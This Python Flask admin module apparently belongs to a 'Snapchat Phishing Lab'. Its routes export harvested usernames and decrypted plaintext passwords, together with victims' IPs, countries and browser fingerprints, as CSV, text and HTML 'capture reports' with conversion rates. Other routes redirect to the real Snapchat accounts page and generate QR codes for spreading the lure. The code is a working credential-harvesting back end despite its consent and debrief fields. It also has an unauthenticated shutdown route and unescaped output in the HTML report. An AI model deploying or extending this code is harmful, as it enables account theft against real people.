import os
import csv
import json
import shutil
import sqlite3
from datetime import datetime
from io import StringIO

from flask import Blueprint, request, jsonify, redirect, render_template_string

from ..config import CONFIG, BASE_DIR
from ..database import log_event, blacklist_ip, is_blacklisted, log_access
from ..crypto import decrypt_password

admin_bp = Blueprint('admin', __name__)


def require_admin():
    key = request.args.get('key') or request.headers.get('X-Admin-Key', '')
    if key != CONFIG["ADMIN_KEY"]:
        blacklist_ip(request.remote_addr, "invalid admin key")
        return jsonify({"error": "forbidden", "message": "Clé admin invalide."}), 403
    return None


@admin_bp.route('/shutdown', methods=['POST'])
def shutdown():
    func = request.environ.get('werkzeug.server.shutdown')
    if func:
        func()
    else:
        os._exit(0)
    return jsonify({"ok": True})


@admin_bp.route('/v2/<path:subpath>')
@admin_bp.route('/v2/')
def v2_catchall(subpath=''):
    forbid = require_admin()
    if forbid:
        return forbid
    return redirect(f'https://accounts.snapchat.com/v2/{subpath}' if subpath else 'https://accounts.snapchat.com/v2/')


@admin_bp.route('/reset', methods=['GET', 'POST'])
def reset_data():
    forbid = require_admin()
    if forbid:
        return forbid
    if request.method == 'GET':
        return '''<form method="POST"><input type="hidden" name="confirm" value="true">
<button style="background:red;color:white;padding:20px;font-size:24px">CONFIRMER LA SUPPRESSION</button></form>'''
    if request.form.get('confirm') != 'true':
        return jsonify({"error": "confirm=true required"}), 400

    if os.path.exists(CONFIG["CAPTURE_DB"]):
        backup_dir = os.path.join(BASE_DIR, "backups")
        os.makedirs(backup_dir, exist_ok=True)
        backup_name = f"captured_credentials_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db"
        shutil.copy2(CONFIG["CAPTURE_DB"], os.path.join(backup_dir, backup_name))

    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    c = conn.cursor()
    c.execute("DELETE FROM captured_credentials")
    c.execute("DELETE FROM experiment_log")
    c.execute("DELETE FROM votes_top3")
    conn.commit()
    conn.close()
    log_event("RESET", "admin")
    return jsonify({"status": "reset", "ok": True})


@admin_bp.route('/export')
def export_data():
    forbid = require_admin()
    if forbid:
        return forbid
    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    c = conn.cursor()

    c.execute('''
        SELECT participant_id, username, password, ip_address, 
               user_agent, timestamp, consent_given, debriefed 
        FROM captured_credentials
    ''')

    rows = c.fetchall()
    conn.close()

    export_data = []
    for row in rows:
        export_data.append({
            "participant_id": row[0],
            "username_length": len(row[1]) if row[1] else 0,
            "password_length": len(row[2]) if row[2] else 0,
            "ip": row[3],
            "user_agent": row[4],
            "timestamp": row[5],
            "consent": row[6],
            "debriefed": row[7]
        })

    return jsonify(export_data)


@admin_bp.route('/export/csv')
def export_csv():
    forbid = require_admin()
    if forbid:
        return forbid
    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    rows = conn.execute("""
        SELECT participant_id, username, password, ip_address, user_agent,
               timestamp, screen_resolution, timezone, browser_language,
               platform, click_count, referrer, country
        FROM captured_credentials ORDER BY id DESC
    """).fetchall()
    conn.close()
    si = StringIO()
    cw = csv.writer(si)
    cw.writerow(["participant_id", "username", "password", "ip", "user_agent",
                  "timestamp", "screen", "timezone", "lang", "platform",
                  "clicks", "referrer", "country"])
    for r in rows:
        decrypted = list(r)
        decrypted[2] = decrypt_password(r[2])
        cw.writerow(decrypted)
    output = si.getvalue()
    return output, 200, {"Content-Type": "text/csv; charset=utf-8",
                         "Content-Disposition": "attachment; filename=captures.csv"}


@admin_bp.route('/export/report')
def export_report():
    forbid = require_admin()
    if forbid:
        return forbid
    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    total = conn.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
    sessions = conn.execute("SELECT COUNT(*) FROM experiment_log WHERE event_type='SESSION_START'").fetchone()[0]
    conversion = (total / sessions * 100) if sessions > 0 else 0
    rows = conn.execute("""
        SELECT participant_id, username, password, ip_address, user_agent,
               timestamp, screen_resolution, timezone, browser_language,
               platform, click_count, referrer, country
        FROM captured_credentials ORDER BY id DESC
    """).fetchall()
    conn.close()

    html_rows = ""
    for i, r in enumerate(rows, 1):
        pw_display = (decrypt_password(r[2])[:3] + "***") if r[2] else ""
        ua_short = (r[4] or "")[:30]
        ref_short = (r[11] or "")[:30]
        html_rows += (
            f"<tr><td>{i}</td><td>{r[1]}</td><td>{pw_display}</td>"
            f"<td>{r[3]}</td><td>{ua_short}</td><td>{r[5]}</td>"
            f"<td>{r[6] or ''}</td><td>{r[7] or ''}</td><td>{r[8] or ''}</td>"
            f"<td>{r[9] or ''}</td><td>{r[10] or 0}</td><td>{ref_short}</td>"
            f"<td>{r[12] or ''}</td></tr>"
        )

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Capture Report</title>
<style>
  body {{ background:#1a1a2e; color:#eee; font-family:monospace; padding:20px; }}
  h1 {{ color:#e94560; text-align:center; }}
  .summary {{ display:flex; gap:20px; margin:20px 0; justify-content:center; }}
  .card {{ background:#16213e; padding:15px; border-radius:8px; flex:1; max-width:250px; text-align:center; }}
  .card h2 {{ margin:0; color:#e94560; font-size:14px; }}
  .card p {{ font-size:28px; margin:5px 0; font-weight:bold; }}
  table {{ width:100%; border-collapse:collapse; margin-top:20px; }}
  th {{ background:#16213e; color:#e94560; padding:10px; text-align:left; }}
  td {{ padding:8px; border-bottom:1px solid #333; }}
  tr:hover {{ background:#16213e; }}
</style>
</head>
<body>
<h1>Snapchat Phishing Lab — Capture Report</h1>
<div class="summary">
  <div class="card"><h2>TOTAL CAPTURES</h2><p>{total}</p></div>
  <div class="card"><h2>CONVERSION RATE</h2><p>{conversion:.1f}%</p></div>
  <div class="card"><h2>SESSIONS</h2><p>{sessions}</p></div>
</div>
<table>
<tr><th>#</th><th>Participant</th><th>Password</th><th>IP</th><th>UA</th><th>Timestamp</th><th>Screen</th><th>Timezone</th><th>Lang</th><th>Platform</th><th>Clicks</th><th>Referrer</th><th>Country</th></tr>
{html_rows}
</table>
</body>
</html>"""
    return html


@admin_bp.route('/export/txt')
def export_txt():
    forbid = require_admin()
    if forbid:
        return forbid
    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    rows = conn.execute("""
        SELECT id, participant_id, username, password, ip_address,
               timestamp, step, country
        FROM captured_credentials ORDER BY id DESC
    """).fetchall()
    sessions = conn.execute("SELECT COUNT(*) FROM experiment_log WHERE event_type='SESSION_START'").fetchone()[0]
    total = conn.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
    conn.close()
    lines = []
    lines.append("=" * 60)
    lines.append("  SNAPCHAT PHISHING LAB - CAPTURE REPORT")
    lines.append("=" * 60)
    lines.append(f"  Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    lines.append(f"  Total captures: {total}  |  Sessions: {sessions}")
    lines.append("-" * 60)
    lines.append("")
    for r in rows:
        pw = decrypt_password(r[3]) if r[3] else "-"
        country = f" [{r[7]}]" if r[7] else ""
        lines.append(f"  #{r[0]} [{r[6] or 'login'}] {r[2] or '-'}")
        lines.append(f"      IP: {r[4]}{country}  |  PW: {pw}")
        lines.append(f"      Time: {r[5]}")
        lines.append("")
    lines.append("-" * 60)
    output = "\n".join(lines)
    return output, 200, {"Content-Type": "text/plain; charset=utf-8",
                         "Content-Disposition": "attachment; filename=captures.txt"}


@admin_bp.route('/qr')
def generate_qr():
    forbid = require_admin()
    if forbid:
        return forbid
    url = request.args.get('url', f'http://localhost:{CONFIG["SERVER_PORT"]}')
    try:
        import qrcode
        img = qrcode.make(url)
        buf = StringIO()
        img.save(buf, format='PNG')
        buf.seek(0)
        return buf.read(), 200, {"Content-Type": "image/png"}
    except Exception as e:
        return jsonify({"error": str(e)}), 500
